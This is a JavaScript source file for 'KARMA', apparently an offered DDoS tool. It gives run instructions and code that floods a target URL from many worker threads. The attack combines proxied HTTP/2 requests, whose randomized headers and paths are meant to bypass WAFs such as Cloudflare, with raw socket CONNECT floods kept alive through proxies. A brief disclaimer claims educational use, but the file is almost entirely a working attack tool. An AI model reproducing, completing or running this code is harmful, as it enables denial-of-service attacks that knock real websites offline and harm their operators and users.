/**
 * KARMA - The Final Version
 *
 * DESCRIPTION:
 * This script is the culmination of all previous versions, designed for maximum
 * impact. It combines a low-level socket flood (for overwhelming network resources)
 * with a high-level, intelligent HTTP/2 flood (for bypassing WAFs like Cloudflare)
 * that run simultaneously in multiple threads.
 *
 * WARNING: EXTREMELY DANGEROUS AND RESOURCE-INTENSIVE.
 * THIS SCRIPT WILL PUSH YOUR SYSTEM TO ITS ABSOLUTE LIMIT AND WILL LIKELY
 * CAUSE IT TO CRASH. USE WITH EXTREME CAUTION AND AT YOUR OWN RISK.
 *
 * LEGAL DISCLAIMER:
 * This tool is provided for educational and research purposes ONLY.
 * Unauthorized attacks against any computer network are illegal under
 * R.A. 10175 (Cybercrime Prevention Act of 2012) and other international
 * laws. The developer assumes NO liability and is NOT responsible for any
 * misuse or damage caused by this program.
 *
 * HOW TO USE:
 * 1. Save as `ddos.js`.
 * 2. Create `proxy.txt`. Proxies are STRONGLY recommended.
 * 3. Install dependency: npm install got-scraping
 * 4. Run from terminal: node ddos.js <url> <seconds> <threads>
 */

const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const fs = 'fs';
const net = 'net';
const tls = 'tls';
const url = 'url';
const path = 'path';

// --- Helper: Load User Agents and Paths ---
function loadList(filename) {
    try {
        return require(fs).readFileSync(filename, 'utf-8').split(/\r?\n/).filter(Boolean);
    } catch {
        return [];
    }
}

// --- Main Thread Logic ---
if (isMainThread) {
    console.log("\x1b[31m", "--- KARMA // The Final Version ---");
    console.log("\x1b[33m", "WARNING: This tool is extremely powerful and dangerous. Use responsibly.");
    console.log("\x1b[0m"); // Reset color

    const targetUrl = process.argv[2];
    const durationSeconds = parseInt(process.argv[3], 10);
    const numThreads = parseInt(process.argv[4], 10);

    if (!targetUrl || !durationSeconds || !numThreads) {
        console.error('ERROR: Missing arguments.');
        console.error('Usage: node ddos.js <url> <seconds> <threads>');
        process.exit(1);
    }

    let proxies = [];
    let userAgents = [];
    let paths = [];
    try {
        proxies = require(fs).readFileSync('proxy.txt', 'utf-8').split(/\r?\n/).filter(p => p.includes(':'));
        userAgents = loadList('user_agents.txt');
        paths = loadList('paths.txt');
        if (proxies.length === 0) throw new Error();
        console.log(`[INFO] Proxies loaded: ${proxies.length}`);
        console.log(`[INFO] User-Agents loaded: ${userAgents.length}`);
        console.log(`[INFO] Paths loaded: ${paths.length}`);
    } catch (error) {
        console.error(`[ERROR] Required file missing or empty. Make sure 'proxy.txt', 'user_agents.txt', and 'paths.txt' exist.`);
        process.exit(1);
    }

    console.log(`[INFO] Target: ${targetUrl}`);
    console.log(`[INFO] Threads: ${numThreads}`);
    console.log(`[INFO] Duration: ${durationSeconds} seconds`);
    console.log("--------------------------------------");
    console.log("\x1b[31m", "Brace for impact. Initializing attack in 5 seconds...");
    console.log("\x1b[0m");

    let totalSent = 0;
    let mainStartTime;

    const mainInterval = setInterval(() => {
        if (!mainStartTime) return;
        const elapsedTime = (Date.now() - mainStartTime) / 1000;
        const rps = (totalSent / elapsedTime) || 0;
        process.stdout.write(`\r[ATTACKING] Requests Sent: ${totalSent} | RPS: ${Math.round(rps)}   `);
    }, 1000);

    setTimeout(() => {
        mainStartTime = Date.now();
        console.log("\nATTACK INITIATED. YOUR SYSTEM IS NOW UNDER MAXIMUM LOAD.");

        const proxiesPerWorker = Math.ceil(proxies.length / numThreads);

        for (let i = 0; i < numThreads; i++) {
            const workerProxies = proxies.slice(i * proxiesPerWorker, (i + 1) * proxiesPerWorker);
            if (workerProxies.length === 0) continue;

            const worker = new Worker(__filename, { workerData: { targetUrl, proxies: workerProxies, durationSeconds, userAgents, paths } });
            worker.on('message', msg => {
                totalSent += msg.sent;
            });
        }
    }, 5000);
}
// --- Worker Thread Logic ---
else {
    (async () => {
        const { gotScraping } = await import('got-scraping');
        const { targetUrl, proxies, durationSeconds, userAgents, paths } = workerData;
        const net = require('net');
        const tls = require('tls');
        const url = require('url');

        const target = url.parse(targetUrl);
        const isTls = target.protocol === 'https:';
        const port = target.port || (isTls ? 443 : 80);

        const endTime = Date.now() + durationSeconds * 1000;
        let sentCount = 0;

        // --- Helper: Random Header Generator ---
        function randomHeaders() {
            const ua = userAgents.length ? userAgents[Math.floor(Math.random() * userAgents.length)] : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
            const referer = Math.random() < 0.5 ? `https://google.com/search?q=${Math.random().toString(36).substring(2, 10)}` : targetUrl;
            const acceptLangs = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fil-PH,fil;q=0.7,en;q=0.3'];
            const acceptLanguage = acceptLangs[Math.floor(Math.random() * acceptLangs.length)];
            const cookie = `sessionid=${Math.random().toString(36).substring(2, 18)};`;
            return {
                'user-agent': ua,
                'referer': referer,
                'accept-language': acceptLanguage,
                'cookie': cookie
            };
        }
        // --- Helper: Random Path ---
        function randomPath() {
            if (!paths.length) return '/';
            return paths[Math.floor(Math.random() * paths.length)];
        }
        // --- Attack Vector 1: Intelligent HTTP/2 Flood ---
        const httpFlooder = async () => {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            const proxyUrl = `http://${proxy}`;
            const path = randomPath();
            const headers = randomHeaders();
            try {
                gotScraping({
                    url: targetUrl + path,
                    proxyUrl: proxyUrl,
                    timeout: { request: 15000 },
                    retry: { limit: 0 },
                    headers: headers,
                    headerGeneratorOptions: {
                        browsers: ['chrome', 'firefox', 'safari'],
                        devices: ['desktop', 'mobile'],
                        operatingSystems: ['windows', 'linux', 'android', 'ios']
                    }
                }).catch(() => {});
                sentCount++;
            } catch (e) {}
        };

        // --- Attack Vector 2: Low-Level Socket Flood ---
        const socketFlooder = () => {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
            const proxyHost = proxy[0];
            const proxyPort = parseInt(proxy[1]);

            const req = `CONNECT ${target.hostname}:${port} HTTP/1.1\r\nHost: ${target.hostname}:${port}\r\n\r\n`;
            let sock = new net.Socket();

            sock.connect(proxyPort, proxyHost, () => {
                sock.write(req);
            });

            sock.on('data', data => {
                // Once connected through proxy, start TLS handshake if needed
                if (data.toString().includes('200')) {
                    let stream = isTls ? tls.connect({ socket: sock, servername: target.hostname }) : sock;
                    
                    // Keep sending minimal data to keep the connection alive
                    setInterval(() => {
                        if (stream.writable) {
                           stream.write("GET / HTTP/1.1\r\nHost: " + target.hostname + "\r\n\r\n");
                           sentCount++;
                        }
                    }, 500);

                    stream.on('error', () => stream.destroy());
                } else {
                    sock.destroy();
                }
            });

            sock.on('error', () => sock.destroy());
        };


        // --- Main Loop ---
        const run = async () => {
            if (Date.now() >= endTime) {
                parentPort.postMessage({ sent: sentCount });
                process.exit(0);
            }
            // Launch a mix of attacks for maximum chaos
            for (let i = 0; i < 200; i++) { // Increase aggression for HTTP requests
                setTimeout(httpFlooder, Math.random() * 300); // Random delay up to 300ms
            }
            for (let i = 0; i < 50; i++) {
                socketFlooder();
            }
            setImmediate(run);
        };
        
        run();

        // Report back to main thread periodically
        setInterval(() => {
            parentPort.postMessage({ sent: sentCount });
            sentCount = 0; // Reset counter after reporting
        }, 3000);
    })();
}